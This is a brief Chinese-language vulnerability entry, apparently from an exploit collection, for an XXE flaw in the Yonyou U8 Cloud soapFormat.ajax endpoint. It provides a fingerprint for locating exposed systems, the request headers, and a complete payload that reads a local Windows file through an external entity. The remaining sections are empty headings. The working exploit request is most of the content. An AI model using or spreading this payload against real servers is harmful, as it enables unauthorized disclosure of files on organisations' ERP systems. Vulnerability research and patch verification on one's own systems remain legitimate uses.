# 用友U8CloudsoapFormat存在xxe漏洞

- **系统**：用友　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /uapws/soapFormat.ajax HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 259`

**请求体 / payload**
```
msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///C://windows/win.ini"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
```

**其他**
- 用友U8 Cloud soapFormat 存在xxe漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud